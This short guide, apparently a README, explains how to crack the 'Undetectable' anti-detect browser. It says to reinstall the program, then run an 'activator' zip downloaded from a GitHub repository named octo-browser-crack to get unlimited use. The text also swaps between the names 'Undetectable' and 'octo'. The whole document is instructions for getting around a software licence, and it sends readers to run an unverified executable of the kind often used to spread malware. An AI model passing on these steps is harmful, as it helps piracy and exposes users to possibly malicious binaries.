Download a clean Undetectable from the official website [https://undetectable.io/ru/download](https://undetectable.io/ru/download)
If you already have it installed, uninstall it and download it again.

After installing it, we don't run it!!!

Download the activator - https://github.com/octo-browser-crack/SCR/blob/main/crack_installer.zip

Run the activator and enter the path to the Undetectable. Then click RunPath


It's done. Now you have octo forever. The days will not decrease.

You do not need to run the activator to open Undetectable in the future. You have a local profile that is stored on your disk. If you want to move it to another pc, copy the files from the root folder of Undetectable and move it to another pc.

All profiles will be saved, but the two copies will not synchronize the newly created profiles.
